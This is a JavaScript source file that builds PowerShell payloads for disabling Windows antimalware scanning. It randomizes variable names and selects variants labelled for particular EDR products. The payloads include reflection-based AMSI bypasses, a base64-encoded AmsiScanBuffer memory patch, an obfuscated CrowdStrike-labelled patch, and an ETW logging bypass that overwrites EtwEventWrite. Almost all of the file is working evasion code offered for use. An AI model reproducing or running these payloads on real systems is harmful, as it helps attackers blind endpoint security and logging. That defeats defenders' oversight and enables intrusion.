// Generate a random string of specified length
function randomString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// Generate a random integer between 0 and max (inclusive)
function randomInt(max) {
    return Math.floor(Math.random() * (max + 1));
}

function getPayload(edr) {
    let memvar = randomString(3 + randomInt(7)); // Random variable name of length 3 to 10

    // Existing payloads for Random selection
    const ForceErrer = `#Unknown - Force error \n$${memvar}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext", "NonPublic,Static").SetValue($null, [IntPtr]$${memvar});`;
    const MattGRefl = `#Matt Graebers Reflection method \n$${memvar}="System.Management.Automation.AmsiUtils";[Ref].Assembly.GetType($${memvar}).GetField('amsiInitFailed',"NonPublic,Static").SetValue($null,$true);`;
    const MattGReflLog = `#Matt Graebers Reflection method with WMF5 autologging bypass \n$${memvar}="System.Management.Automation.AmsiUtils";[Delegate]::CreateDelegate(("Func\`\`3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType($${memvar})),('GetField')).Invoke('amsiInitFailed',(("NonPublic,Static") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);`;
    const MattGref02 = `#Matt Graebers second Reflection method \n$${memvar}="System.Management.Automation.AmsiUtils";[Runtime.InteropServices.Marshal]::("WriteInt32")([Ref].Assembly.GetType($${memvar}).GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static").GetValue($null),0x${randomInt(2147483647).toString(16)});`;
    const RastaBuf = atob("I1Jhc3RhLW1vdXNlcyBBbXNpLVNjYW4tQnVmZmVyIHBhdGNoIFxuDQokV2luMzIgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KcHVibGljIGNsYXNzIFdpbjMyIHsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7DQogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KfQ0KIkANCg0KQWRkLVR5cGUgJFdpbjMyDQoNCiRMaWJMb2FkID0gW1dpbjMyXTo6TG9hZExpYnJhcnkoImFtc2kuZGxsIikNCiRNZW1BZHIgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTGliTG9hZCwgIkFtc2lTY2FuQnVmZmVyIikNCiRwID0gMA0KW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJE1lbUFkciwgW3VpbnQzMl01LCAweDQwLCBbcmVmXSRwKQ0KJHZhcjEgPSAiMHhCOCINCiR2YXIyID0gIjB4NTciDQokdmFyMyA9ICIweDAwIg0KJHZhcjQgPSAiMHgwNyINCiR2YXI1ID0gIjB4ODAiDQokdmFyNiA9ICIweEMzIg0KJFBhdGNoID0gW0J5dGVbXV0gKCR2YXIxLCR2YXIyLCR2YXIzLCR2YXI0LCskdmFyNSwrJHZhcjYpDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJE1lbUFkciwgNik=");

    // EDR-specific payloads
    const crowdStrikePayload = `#CrowdStrike AMSI Bypass
    function Find-Core($ModuleName, $FunctionName) {
    $Assembly = ([AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and $_.Location.EndsWith('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $Methods = $Assembly.GetMethods() | ? { $_.Name -cmatch '^Ge.*P.*oc.*ddress$' }
    $Methods[0].Invoke($null, @($Assembly.GetMethod('GetModuleHandle').Invoke($null, @($ModuleName)), $FunctionName))
}

function Build-Delegate($ParamTypes, $ReturnType = [System.Void]) {
    $DynAssembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('DynDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $Module = $DynAssembly.DefineDynamicModule('MemModule', $false)
    $Type = $Module.DefineType('DelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $Type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ParamTypes).SetImplementationFlags('Runtime, Managed')
    $Type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParamTypes).SetImplementationFlags('Runtime, Managed')
    $Type.CreateType()
}

$FuncAddress = Find-Core ([char]0x61 + [char]0x6D + [char]0x73 + [char]0x69 + [char]0x2E + [char]0x64 + [char]0x6C + [char]0x6C) ([char]0x41 + [char]0x6D + [char]0x73 + [char]0x69 + [char]0x53 + [char]0x63 + [char]0x61 + [char]0x6E + [char]0x42 + [char]0x75 + [char]0x66 + [char]0x66 + [char]0x65 + [char]0x72)

$ProtectDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Find-Core 'kernel32.dll' 'VirtualProtect'), (Build-Delegate @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$ProtectDelegate.Invoke($FuncAddress, 1, 0x40, [ref]($OldProtect = 0))
Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
[System.Runtime.InteropServices.Marshal]::Copy(@(0xC3), 0, $FuncAddress, 1)

# ETW Bypass
$emh = (Find-Core 'ntdll.dll' 'EtwEventWrite')
$o = 0
$pr = $ProtectDelegate.Invoke($emh, 3, 0x40, [ref]$o)
$s = [Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
if ($s -eq 8) {
    [Runtime.InteropServices.Marshal]::WriteByte($emh, 0xC3)
} else {
    [Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8, 0xff, 0x55), 0, $emh, 3)
}`;
    const microsoftXDRPayload = `#MicrosoftXDR AMSI Bypass (Placeholder) \n$${memvar}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext", "NonPublic,Static").SetValue($null, [IntPtr]$${memvar});`;
    const sentinelOnePayload = `#SentinelOne AMSI Bypass (Placeholder) \n$${memvar}="System.Management.Automation.AmsiUtils";[Runtime.InteropServices.Marshal]::("WriteInt32")([Ref].Assembly.GetType($${memvar}).GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static").GetValue($null),0x${randomInt(2147483647).toString(16)});`;
    const defenderPayload = `#Defender AMSI Bypass (Placeholder) \n$${memvar}="System.Management.Automation.AmsiUtils";[Delegate]::CreateDelegate(("Func\`\`3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType($${memvar})),('GetField')).Invoke('amsiInitFailed',(("NonPublic,Static") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);`;

    switch (edr) {
        case 'CrowdStrike':
            return crowdStrikePayload;
        case 'MicrosoftXDR':
            return microsoftXDRPayload;
        case 'SentinelOne':
            return sentinelOnePayload;
        case 'Defender':
            return defenderPayload;
        case 'Random':
        default:
            switch (randomInt(4)) {
                case 0:
                    return ForceErrer;
                case 1:
                    return MattGRefl;
                case 2:
                    return MattGReflLog;
                case 3:
                    return MattGref02;
                case 4:
                    return RastaBuf;
            }
    }
}
